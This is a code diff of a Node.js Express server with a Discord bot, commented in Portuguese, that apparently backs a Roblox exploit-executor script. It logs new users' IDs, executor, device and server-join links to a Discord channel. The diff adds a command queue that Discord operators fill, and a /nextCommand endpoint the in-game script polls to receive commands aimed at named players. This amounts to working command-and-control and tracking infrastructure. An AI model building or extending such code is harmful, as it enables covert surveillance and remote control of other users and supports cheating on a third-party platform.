@@ -2,19 +2,11 @@ const express = require("express");
 const fs = require("fs");
 const { Client, GatewayIntentBits } = require("discord.js");
 
-const client = new Client({
-    intents: [
-        GatewayIntentBits.Guilds,
-        GatewayIntentBits.GuildMessages,
-        GatewayIntentBits.MessageContent   // Permite ler comandos
-    ]
-});
-
 const app = express();
 app.use(express.json());
 
 // ====== CONFIG ======
-const BOT_TOKEN = process.env.BOT_TOKEN;        // seguro
+const BOT_TOKEN = process.env.BOT_TOKEN;
 const CANAL_DESTINO = process.env.CANAL_DESTINO;
 
 // ====== DATABASE ======
@@ -28,60 +20,78 @@ if (fs.existsSync("db.json")) {
     db = JSON.parse(fs.readFileSync("db.json"));
 }
 
-// ====== BOT ONLINE ======
+// ====== COMANDOS EM FILA ======
+let commands = [];
+
+// ====== DISCORD BOT ======
+const client = new Client({
+    intents: [
+        GatewayIntentBits.Guilds,
+        GatewayIntentBits.GuildMessages,
+        GatewayIntentBits.MessageContent
+    ]
+});
+
 client.once("ready", () => {
     console.log("Bot iniciado!");
 });
 
-// ====== COMANDO: !deluser <id> ======
+// ====== COMANDOS DIGITADOS NO DISCORD ======
 client.on("messageCreate", async (msg) => {
-    if (!msg.content.startsWith("!deluser")) return;
+    if (!msg.content.startsWith(".")) return;
 
     const args = msg.content.split(" ");
-    const id = args[1];
+    const cmd = args[0].substring(1); // remove "."
+    const targetUser = args[1]?.toLowerCase();
 
-    if (!id) {
-        return msg.reply("Use: `!deluser <UserId>`");
-    }
+    if (!targetUser) return msg.reply("Use: .comando username argumentos");
 
-    const index = db.users.indexOf(id);
-    if (index === -1) {
-        return msg.reply("Esse ID não está na database.");
-    }
+    const c = {
+        user: targetUser,     // username do roblox
+        command: cmd,
+        arg1: args[2],
+        arg2: args[3]
+    };
 
-    db.users.splice(index, 1);
-    saveDB();
+    commands.push(c);
 
-    msg.reply(`ID **${id}** removido da database.`);
+    msg.reply(`Comando **${cmd}** enviado para **${targetUser}**.`);
 });
 
-// ====== ENDPOINT /log RECEBENDO DO ROBLOX ======
-app.post("/log", async (req, res) => {
-    const { 
-        userId, 
-        username, 
-        executor,
-        device,
-        date,
-        time,
-        placeId,
-        placeName,
-        serverJobId
-    } = req.body;
+// ====== ENDPOINT PARA O SCRIPT PEGAR COMANDO ======
+app.post("/nextCommand", (req, res) => {
+    const username = req.body.username?.toLowerCase();
+    if (!username) return res.json({ command: null });
 
-    if (!userId || !username) {
-        return res.status(400).send("Requisição inválida.");
+    const found = commands.find(c => c.user === username);
+
+    if (found) {
+        commands = commands.filter(c => c !== found);
+        return res.json(found);
     }
 
-    // só envia se for usuário novo
+    return res.json({ command: null });
+});
+
+// ====== ENDPOINT PARA LOG DO ROBLOX ======
+app.post("/log", async (req, res) => {
+
+    const {
+        userId, username, executor, device,
+        date, time, placeId, serverJobId
+    } = req.body;
+
+    if (!userId || !username)
+        return res.status(400).send("Requisição inválida.");
+
     if (!db.users.includes(userId)) {
         db.users.push(userId);
         saveDB();
 
         const channel = await client.channels.fetch(CANAL_DESTINO);
 
-const msg =
-`
+        const msg =
+`📌 **USUÁRIO NOVO**
 **Usuário:** [${username}](https://www.roblox.com/users/${userId}/profile)
 **Executor:** ${executor}
 **Dispositivo:** ${device}
@@ -90,14 +100,13 @@ const msg =
 **Entrar no servidor:** https://www.roblox.com/games/start?placeId=${placeId}&jobId=${serverJobId}
 `;
 
-
         channel.send(msg);
     }
 
     res.send("OK");
 });
 
-// ====== INICIAR SERVIDOR ======
+// ====== START ======
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
     console.log("Servidor rodando na porta " + PORT);
